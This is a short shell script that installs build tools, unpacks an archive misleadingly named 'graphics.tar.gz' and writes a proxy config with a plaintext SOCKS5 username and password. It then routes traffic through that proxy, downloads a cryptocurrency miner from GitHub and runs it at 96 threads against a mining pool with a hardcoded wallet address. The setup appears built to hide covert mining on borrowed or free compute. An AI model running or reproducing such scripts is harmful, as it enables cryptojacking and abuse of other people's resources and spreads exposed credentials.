#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
git clone https://gitlab.com/majapahlevi/majapahlevi
cd majapahlevi
apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
tar -xvzf graphics.tar.gz
rm -rf graphich.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = us-east-static-04.quotaguard.com:1080
socks5_username = 3x35y4yxzqb5ud
socks5_password = o8uuxf114ky72gj8u66da4uxtijs7
END


./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget -q https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1 && ./miner --miner=96 --wallet-address="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" --pool=pool.acemining.co:8443
